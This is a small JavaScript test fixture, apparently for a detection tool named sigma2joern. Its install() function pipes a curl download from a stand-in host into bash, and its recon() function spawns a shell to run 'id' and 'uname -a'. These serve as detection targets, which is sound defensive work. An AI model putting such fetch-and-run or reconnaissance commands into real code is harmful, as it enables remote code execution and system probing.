// Test fixture for sigma2joern. Nothing is executed when this file is loaded.
const child_process = require('child_process');
const cp = require('child_process');
const host = 'example.invalid';

function install() {
  child_process.exec(`curl -s http://${host}/x.sh | bash`);
}

function recon() {
  cp.spawn('bash', ['-c', 'id; uname -a']);
}

function parse(s) {
  const re = /a+/;
  return re.exec(s);
}

module.exports = { install, recon, parse };
